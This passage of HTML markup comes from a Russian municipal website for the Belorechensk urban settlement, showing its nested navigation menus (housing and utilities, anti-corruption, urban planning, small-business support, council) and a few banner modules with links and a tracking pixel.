class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >ЖКХ<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-205" class="accordeonck item205 first level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/zhkkh/tosy" >ТОСы<span class="accordeonckdesc"></span></a></span></li><li id="item-206" class="accordeonck item206 parent parent level3 " data-level="3" ><span class="accordeonck_outer toggler toggler_3"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >МУПы<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_3" style="display:none;"><li id="item-301" class="accordeonck item301 first last level4 " data-level="4" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/zhkkh/mupy/informatsiya-o-zarabotnoj-plate" >Информация о заработной плате<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-207" class="accordeonck item207 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/zhkkh/upravlyayushchie-kompanii" >Управляющие компании<span class="accordeonckdesc"></span></a></span></li><li id="item-208" class="accordeonck item208 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/zhkkh/tszh" >ТСЖ<span class="accordeonckdesc"></span></a></span></li><li id="item-240" class="accordeonck item240 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/zhkkh/informatsiya-zhkkh" >Информация-ЖКХ<span class="accordeonckdesc"></span></a></span></li><li id="item-304" class="accordeonck item304 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/zhkkh/munitsipal-nyj-energoservisnyj-kontrakt" >Муниципальный энергосервисный контракт<span class="accordeonckdesc"></span></a></span></li><li id="item-453" class="accordeonck item453 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/zhkkh/programma-kompleksnogo-razvitiya-sotsialnoj-infrastruktury-belorechenskogo-gorodskogo-poseleniya-belorechenskogo-rajona-na-2016-2032-gody" >Программа «Комплексного развития социальной инфраструктуры Белореченского городского поселения   Белореченского района на 2016 – 2032 годы»<span class="accordeonckdesc"></span></a></span></li><li id="item-459" class="accordeonck item459 parent last parent level3 " data-level="3" ><span class="accordeonck_outer toggler toggler_3"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >ОЗП<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_3" style="display:none;"><li id="item-460" class="accordeonck item460 first level4 " data-level="4" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/zhkkh/ozp/2025-2026" >2025-2026<span class="accordeonckdesc"></span></a></span></li><li id="item-462" class="accordeonck item462 last level4 " data-level="4" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/zhkkh/ozp/2026-2027" >2026-2027<span class="accordeonckdesc"></span></a></span></li></ul></li></ul></li><li id="item-209" class="accordeonck item209 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/fond-kapitalnogo-remonta-mkd" >Фонд капитального ремонта МКД<span class="accordeonckdesc"></span></a></span></li><li id="item-211" class="accordeonck item211 parent parent level2 " data-level="2" ><span class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Антикоррупционная деятельность<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-446" class="accordeonck item446 first parent parent level3 " data-level="3" ><span class="accordeonck_outer toggler toggler_3"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Нормативные правовые и иные акты в сфере противодействия коррупции<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_3" style="display:none;"><li id="item-449" class="accordeonck item449 first level4 " data-level="4" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/normativnye-pravovye-i-inye-akty-v-sfere-protivodejstviya-korruptsii/federalnoe-zakonodatelstvo" >Федеральное законодательство<span class="accordeonckdesc"></span></a></span></li><li id="item-450" class="accordeonck item450 last level4 " data-level="4" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/normativnye-pravovye-i-inye-akty-v-sfere-protivodejstviya-korruptsii/zakonodatelstvo-krasnodarskogo-kraya" >Законодательство Краснодарского края<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-447" class="accordeonck item447 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/formy-dokumentov-svyazannykh-s-protivodejstviem-korruptsii-dlya-zapolneniya" >Формы документов, связанных с противодействием коррупции, для заполнения<span class="accordeonckdesc"></span></a></span></li><li id="item-448" class="accordeonck item448 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/obratnaya-svyaz-dlya-soobshchenij-o-faktakh-korruptsii" >Обратная связь для сообщений о фактах коррупции<span class="accordeonckdesc"></span></a></span></li><li id="item-454" class="accordeonck item454 last level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/metodicheskie-materialy" >Методические материалы<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-226" class="accordeonck item226 parent parent level2 " data-level="2" ><span class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Формирование комфортной городской среды<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-333" class="accordeonck item333 first level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/blagoustrojstvo/konkurs-malye-goroda" >Конкурс &quot;Малые города&quot;<span class="accordeonckdesc"></span></a></span></li><li id="item-371" class="accordeonck item371 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/blagoustrojstvo/2022" >Онлайн - голосование ФКГС <span class="accordeonckdesc"></span></a></span></li><li id="item-445" class="accordeonck item445 last level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/blagoustrojstvo/internet-golosovanie-2023" >Интернет-голосование 2023<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-231" class="accordeonck item231 parent parent level2 " data-level="2" ><span class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Транспортная инфраструктура<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-343" class="accordeonck item343 first level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/transportnaya-infrastruktura/passazhirskie-perevozki" >Пассажирские перевозки<span class="accordeonckdesc"></span></a></span></li><li id="item-344" class="accordeonck item344 last level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/transportnaya-infrastruktura/dorozhnaya-deyatelnost" >Дорожная деятельность<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-236" class="accordeonck item236 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/sotsialnaya-infrastruktura" >Социальная инфраструктура<span class="accordeonckdesc"></span></a></span></li><li id="item-282" class="accordeonck item282 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/munitsipalnoe-imushchestvo" >Муниципальное имущество<span class="accordeonckdesc"></span></a></span></li><li id="item-302" class="accordeonck item302 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/snitarnaya-formovochnaya-obrezka-zelenykh-nasazhdenij" >Санитарная(формовочная) обрезка зеленых насаждений<span class="accordeonckdesc"></span></a></span></li><li id="item-331" class="accordeonck item331 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/sozdanie-mest-nakopleniya-tverdykh-bytovykh-otkhodov-i-vedeniya-reestra" >Создание мест накопления твердых бытовых отходов и ведения реестра<span class="accordeonckdesc"></span></a></span></li><li id="item-336" class="accordeonck item336 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/pravila-blagoustrojstva-belorechenskogo-gorodskogo-poseleniya" >Правила благоустройства Белореченского городского поселения<span class="accordeonckdesc"></span></a></span></li><li id="item-458" class="accordeonck item458 last level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/sotsialnaya-sfera/initsiativnoe-byudzhetirovanie" >Инициативное бюджетирование<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-112" class="accordeonck item112 parent parent level1 " data-level="1" ><span class="accordeonck_outer toggler toggler_1"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Совет<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_1" style="display:none;"><li id="item-213" class="accordeonck item213 first level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/sovet/predsedatel-soveta" >Председатель совета<span class="accordeonckdesc"></span></a></span></li><li id="item-188" class="accordeonck item188 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/sovet/spisok-deputatov" >Список депутатов<span class="accordeonckdesc"></span></a></span></li><li id="item-189" class="accordeonck item189 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/sovet/grafik-priema" >График приема<span class="accordeonckdesc"></span></a></span></li><li id="item-214" class="accordeonck item214 parent last parent level2 " data-level="2" ><span class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Документы<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-190" class="accordeonck item190 first level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sovet/dokumenty/pravotvorchestvo-obnarodovanie" >Решения<span class="accordeonckdesc"></span></a></span></li><li id="item-191" class="accordeonck item191 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sovet/dokumenty/proekty-reshenij" >Проекты решений<span class="accordeonckdesc"></span></a></span></li><li id="item-215" class="accordeonck item215 last level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/sovet/dokumenty/svedeniya-o-dokhodakh" >Сведения о доходах<span class="accordeonckdesc"></span></a></span></li></ul></li></ul></li><li id="item-323" class="accordeonck item323 parent parent level1 " data-level="1" ><span class="accordeonck_outer toggler toggler_1"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Архитектура и градостроительство<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_1" style="display:none;"><li id="item-325" class="accordeonck item325 first parent parent level2 " data-level="2" ><span class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Правила землепользования и застройки<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-328" class="accordeonck item328 first level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/pravila-zemlepolzovaniya-i-zastrojki/uslovno-razreshennyj-vid-ispol-zovaniya-zemel-nogo-uchastka-i-obekta" >Условно разрешенный вид использования земельного участка и обекта<span class="accordeonckdesc"></span></a></span></li><li id="item-329" class="accordeonck item329 level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/pravila-zemlepolzovaniya-i-zastrojki/otklaneniya-ot-predel-nykh-parametrov-razreshennogo-stroitel-stva-rekonstruktsiya" >Отклонения от предельных параметров разрешенного строительства (реконструкция)<span class="accordeonckdesc"></span></a></span></li><li id="item-330" class="accordeonck item330 last level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/pravila-zemlepolzovaniya-i-zastrojki/pravila-zemlepol-zovaniya-i-zastrojki-bgp" >Правила землепользования и застройки БГП<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-243" class="accordeonck item243 parent parent level2 " data-level="2" ><span class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Градостроительная деятельность<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-306" class="accordeonck item306 first level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/novosti-v-sfere-gradostroitel-stva" >Новости в сфере градостроительства<span class="accordeonckdesc"></span></a></span></li><li id="item-307" class="accordeonck item307 parent parent level3 " data-level="3" ><span class="accordeonck_outer toggler toggler_3"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Документация по планировке территорий<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_3" style="display:none;"><li id="item-308" class="accordeonck item308 first level4 " data-level="4" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumentatsiya-po-planirovke-territorij/proekty-mezhevaniya" >Проекты межевания<span class="accordeonckdesc"></span></a></span></li><li id="item-309" class="accordeonck item309 last level4 " data-level="4" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumentatsiya-po-planirovke-territorij/proekty-planirovki" >Проекты планировки<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-326" class="accordeonck item326 parent parent level3 " data-level="3" ><span class="accordeonck_outer toggler toggler_3"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Документы территориального планирования<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_3" style="display:none;"><li id="item-327" class="accordeonck item327 first parent last parent level4 " data-level="4" ><span class="accordeonck_outer toggler toggler_4"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Генеральный план<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_4" style="display:none;"><li id="item-347" class="accordeonck item347 first level5 " data-level="5" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumenty-territorial-nogo-planirovaniya/general-nyj-plan/materialy-po-obosnovaniyu" >Материалы по обоснованию<span class="accordeonckdesc"></span></a></span></li><li id="item-348" class="accordeonck item348 level5 " data-level="5" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumenty-territorial-nogo-planirovaniya/general-nyj-plan/polozheniya-utverzhdaemaya-chast" >Положения (утверждаемая часть)<span class="accordeonckdesc"></span></a></span></li><li id="item-351" class="accordeonck item351 last level5 " data-level="5" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumenty-territorial-nogo-planirovaniya/general-nyj-plan/dokumenty" >Документы<span class="accordeonckdesc"></span></a></span></li></ul></li></ul></li></ul></li><li id="item-429" class="accordeonck item429 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/rosreestr" >Росреестр<span class="accordeonckdesc"></span></a></span></li><li id="item-451" class="accordeonck item451 last level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/arkhitektura-i-gradostroitel-stvo/normativy-gradostroitelnogo-proektirovaniya" >Нормативы градостроительного проектирования<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-259" class="accordeonck item259 parent parent level1 " data-level="1" ><span class="accordeonck_outer toggler toggler_1"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Муниципальный контроль<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_1" style="display:none;"><li id="item-260" class="accordeonck item260 first parent parent level2 " data-level="2" ><span class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Муниципальный жилищный контроль<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-261" class="accordeonck item261 first last level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/munitsipalnyj-kontrol/munitsipalnyj-zhilishchnyj-kontrol/profilaktika-narushenij-obyazatelnykh-trebovanij" >Профилактика нарушений обязательных требований<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-288" class="accordeonck item288 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/munitsipalnyj-kontrol/vnutrennij-finansovyj-kontrol" >Внутренний финансовый контроль<span class="accordeonckdesc"></span></a></span></li><li id="item-363" class="accordeonck item363 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/munitsipalnyj-kontrol/munitsipalnyj-zemelnyj-kontrol" >Муниципальный земельный контроль<span class="accordeonckdesc"></span></a></span></li><li id="item-463" class="accordeonck item463 last level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/munitsipalnyj-kontrol/munitsipalnyj-kontrol-v-sfere-blagoustrojstva" >Муниципальный контроль в сфере благоустройства<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-293" class="accordeonck item293 level1 " data-level="1" ><span class="accordeonck_outer "><a class="accordeonck " href="/nezavisimaya-antikorruptsionnaya-ekspertiza" >Независимая антикоррупционная экспертиза<span class="accordeonckdesc"></span></a></span></li><li id="item-311" class="accordeonck item311 parent parent level1 " data-level="1" ><span class="accordeonck_outer toggler toggler_1"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Поддержка малого и среднего предпринимательства<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_1" style="display:none;"><li id="item-312" class="accordeonck item312 first parent parent level2 " data-level="2" ><span class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Общая информация<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-313" class="accordeonck item313 first level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/obshchaya-informatsiya/usloviya-otneseniya-k-subektam-malogo-i-srednego-predprinimatel-stva" >Условия отнесения к субъектам малого и среднего предпринимательства<span class="accordeonckdesc"></span></a></span></li><li id="item-314" class="accordeonck item314 last level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/obshchaya-informatsiya/edinyj-reestr-subektov-malogo-i-srednego-predprinimatel-stva" >Единый реестр субъектов малого и среднего предпринимательства<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-315" class="accordeonck item315 parent parent level2 " data-level="2" ><span class="accordeonck_outer toggler toggler_2"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Информационная поддержка субъектов МСП<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_2" style="display:none;"><li id="item-316" class="accordeonck item316 first parent parent level3 " data-level="3" ><span class="accordeonck_outer toggler toggler_3"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Информация о реализации программ поддержки<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_3" style="display:none;"><li id="item-317" class="accordeonck item317 first level4 " data-level="4" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsionnaya-podderzhka-subektov-msp/informatsiya-o-realizatsii-programm-podderzhki/vedomstvennaya-tselevaya-programma-g-belorechensk" >Ведомственная целевая программа г. Белореченск<span class="accordeonckdesc"></span></a></span></li><li id="item-321" class="accordeonck item321 level4 " data-level="4" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsionnaya-podderzhka-subektov-msp/informatsiya-o-realizatsii-programm-podderzhki/itogi-realizatsii-tselevoj-kraevoj-programmy" >Итоги реализации целевой краевой программы <span class="accordeonckdesc"></span></a></span></li><li id="item-322" class="accordeonck item322 last level4 " data-level="4" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsionnaya-podderzhka-subektov-msp/informatsiya-o-realizatsii-programm-podderzhki/obyavlennye-kontursy-na-okazanie-finansovoj-podderzhki-subektam-msp" >Объявленные конкурсы на оказание финансовой поддержки субъектам МСП<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-456" class="accordeonck item456 last level3 " data-level="3" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsionnaya-podderzhka-subektov-msp/dlya-svedeniya" >Для сведения<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-318" class="accordeonck item318 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/imushchestvennaya-podderzhka-subektov-msp" >Имущественная поддержка субъектов МСП<span class="accordeonckdesc"></span></a></span></li><li id="item-319" class="accordeonck item319 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/konsul-tatsionnaya-podderzhka" >Консультационная поддержка<span class="accordeonckdesc"></span></a></span></li><li id="item-320" class="accordeonck item320 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsiya-ob-organizatsiyakh-obrazuyushchikh-infrastrukturu-podderzhki-subektov-malogo-i-srednego-predprinimatel-stva" >Информация об организациях, образующих инфраструктуру поддержки субъектов малого и среднего предпринимательства<span class="accordeonckdesc"></span></a></span></li><li id="item-346" class="accordeonck item346 level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/novosti-pred" >Новости<span class="accordeonckdesc"></span></a></span></li><li id="item-360" class="accordeonck item360 last level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/podderzhka-malogo-i-srednego-predprinimatel-stva/finansovoe-prosveshchenie" >Финансовое просвещение<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-362" class="accordeonck item362 parent parent level1 " data-level="1" ><span class="accordeonck_outer toggler toggler_1"><span class="toggler_icon"></span><a class="accordeonck " href="javascript:void(0);" >Муниципальные услуги<span class="accordeonckdesc"></span></a></span><ul class="accordeonck content_1" style="display:none;"><li id="item-263" class="accordeonck item263 first last level2 " data-level="2" ><span class="accordeonck_outer "><a class="accordeonck " href="/munitsipalnye-uslugi/administrativnyj-reglament" >Административный регламент<span class="accordeonckdesc"></span></a></span></li></ul></li><li id="item-455" class="accordeonck item455 level1 " data-level="1" ><span class="accordeonck_outer "><a class="accordeonck " href="/sledstvennyj-otdel-po-belorechenskomu-rajonu-su-sk-rf-po-krasnodarskomu-krayu" >Следственный отдел по Белореченскому району СУ СК РФ по Краснодарскому краю<span class="accordeonckdesc"></span></a></span></li><li id="item-461" class="accordeonck item461 level1 " data-level="1" ><span class="accordeonck_outer "><a class="accordeonck " href="/mku-upravlenie-go-i-chs-pb-i-ss-bgp" >МКУ «Управление ГО и ЧС, ПБ и СС БГП»<span class="accordeonckdesc"></span></a></span></li><li id="item-483" class="accordeonck item483 last level1 " data-level="1" ><span class="accordeonck_outer "><a class="accordeonck " href="/ob-uvekovechenii-pamyati-pogibshikh-pri-zashchite-otechestva" >&quot;Об увековечении памяти погибших при защите Отечества&quot;<span class="accordeonckdesc"></span></a></span></li></ul></div>
+		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<p><a href="https://forms.gle/gogNSj2sE4A58xjs9"><img src="/images/banners/01-03-02.png" alt="" style="display: block; margin-left: auto; margin-right: auto;" /></a></p>
+<div style="text-align: center;">&nbsp;<img src="/images/news/2020/08/25/QR.jpg" alt="QR" style="display: block; margin-left: auto; margin-right: auto;" /></div>
+<div>&nbsp;</div>
+<div>&nbsp;</div>
+<div>&nbsp;</div></div>
+		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<p><a href="/881-vazhnaya-informatsiya-goryachaya-liniya"><img src="/images/banners/zarplata.jpg" alt="zarplata" style="display: block; margin-left: auto; margin-right: auto;" /><img src="https://clck.yandex.ru/click/dtype=stred/pid=7/cid=1227/*https://img.yandex.ru/i/pix.gif" alt="" width="1" height="1" border="0" /></a></p></div>
+		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<p><a href="/892-bank-rossii-provodit-sotsiologicheskij-opros-naseleniya-po-finansovoj-gramotnosti"><img src="/images/banners/Fin-gram.jpg" alt="Fin gram" width="200" height="133" style="display: block; margin-left: auto; margin-right: auto;" /><img src="https://clck.yandex.ru/click/dtype=stred/pid=7/cid=1227/*https://img.yandex.ru/i/pix.gif" alt="" width="1" height="1" border="0" /></a></p></div>
+		</div>
+			<div class="moduletable_RMenu">
+						<ul class="nav menujustify-content-around mod-list" id="menu_top">
+<li class="item-108 deeper parent"><a href="/administratsiya" >Администрация</a><ul class="nav-child unstyled small"><li class="item-116"><a href="/administratsiya/glava-goroda" >Глава города</a></li><li class="item-118"><a href="/administratsiya/struktura" >Структура</a></li><li class="item-179 deeper parent"><a href="/administratsiya/dokumenty" >Документы</a><ul class="nav-child unstyled small"><li class="item-339"><a href="/administratsiya/dokumenty/spravochno" >Справочно</a></li><li class="item-178"><a href="/administratsiya/dokumenty/ustav-poseleniya" >Устав поселения</a></li><li class="item-181"><a href="/administratsiya/dokumenty/postanovleniya-obnarodovanie" >Постановления (обнародование)</a></li><li class="item-183"><a href="/administratsiya/dokumenty/spravki-o-dokhodakh" >Сведения о доходах</a></li><li class="item-283"><a href="/administratsiya/dokumenty/tekhnologicheskie-skhemy" >Технологические схемы</a></li></ul></li><li class="item-201"><a href="/administratsiya/polnomochiya" >Полномочия</a></li><li class="item-202"><a href="/administratsiya/kadrovaya-rabota" >Кадровая работа</a></li><li class="item-203"><a href="/administratsiya/deyatelnost-administrativnoj-komissii" >Деятельность административной комиссии</a></li><li class="item-264"><a href="/administratsiya/territorialnaya-komissiya" >Территориальная комиссия</a></li><li class="item-337"><a href="/administratsiya/o-gorode" >О городе</a></li><li class="item-117"><a href="/administratsiya/kontakty" >Контакты</a></li><li class="item-359"><a href="/administratsiya/besplatnaya-yuridicheskaya-pomoshch" >Бесплатная юридическая помощь</a></li></ul></li><li class="item-198 deeper parent"><a href="/sotsialnaya-sfera" >Социальная сфера</a><ul class="nav-child unstyled small"><li class="item-204 deeper parent"><a href="/sotsialnaya-sfera/zhkkh" >ЖКХ</a><ul class="nav-child unstyled small"><li class="item-205"><a href="/sotsialnaya-sfera/zhkkh/tosy" >ТОСы</a></li><li class="item-206 deeper parent"><a href="/sotsialnaya-sfera/zhkkh/mupy" >МУПы</a><ul class="nav-child unstyled small"><li class="item-301"><a href="/sotsialnaya-sfera/zhkkh/mupy/informatsiya-o-zarabotnoj-plate" >Информация о заработной плате</a></li></ul></li><li class="item-207"><a href="/sotsialnaya-sfera/zhkkh/upravlyayushchie-kompanii" >Управляющие компании</a></li><li class="item-208"><a href="/sotsialnaya-sfera/zhkkh/tszh" >ТСЖ</a></li><li class="item-240"><a href="/sotsialnaya-sfera/zhkkh/informatsiya-zhkkh" >Информация-ЖКХ</a></li><li class="item-304"><a href="/sotsialnaya-sfera/zhkkh/munitsipal-nyj-energoservisnyj-kontrakt" >Муниципальный энергосервисный контракт</a></li><li class="item-453"><a href="/sotsialnaya-sfera/zhkkh/programma-kompleksnogo-razvitiya-sotsialnoj-infrastruktury-belorechenskogo-gorodskogo-poseleniya-belorechenskogo-rajona-na-2016-2032-gody" >Программа «Комплексного развития социальной инфраструктуры Белореченского городского поселения   Белореченского района на 2016 – 2032 годы»</a></li><li class="item-459 deeper parent"><a href="/sotsialnaya-sfera/zhkkh/ozp" >ОЗП</a><ul class="nav-child unstyled small"><li class="item-460"><a href="/sotsialnaya-sfera/zhkkh/ozp/2025-2026" >2025-2026</a></li><li class="item-462"><a href="/sotsialnaya-sfera/zhkkh/ozp/2026-2027" >2026-2027</a></li></ul></li></ul></li><li class="item-209"><a href="/sotsialnaya-sfera/fond-kapitalnogo-remonta-mkd" >Фонд капитального ремонта МКД</a></li><li class="item-211 deeper parent"><a href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost" >Антикоррупционная деятельность</a><ul class="nav-child unstyled small"><li class="item-446 deeper parent"><a href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/normativnye-pravovye-i-inye-akty-v-sfere-protivodejstviya-korruptsii" >Нормативные правовые и иные акты в сфере противодействия коррупции</a><ul class="nav-child unstyled small"><li class="item-449"><a href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/normativnye-pravovye-i-inye-akty-v-sfere-protivodejstviya-korruptsii/federalnoe-zakonodatelstvo" >Федеральное законодательство</a></li><li class="item-450"><a href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/normativnye-pravovye-i-inye-akty-v-sfere-protivodejstviya-korruptsii/zakonodatelstvo-krasnodarskogo-kraya" >Законодательство Краснодарского края</a></li></ul></li><li class="item-447"><a href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/formy-dokumentov-svyazannykh-s-protivodejstviem-korruptsii-dlya-zapolneniya" >Формы документов, связанных с противодействием коррупции, для заполнения</a></li><li class="item-448"><a 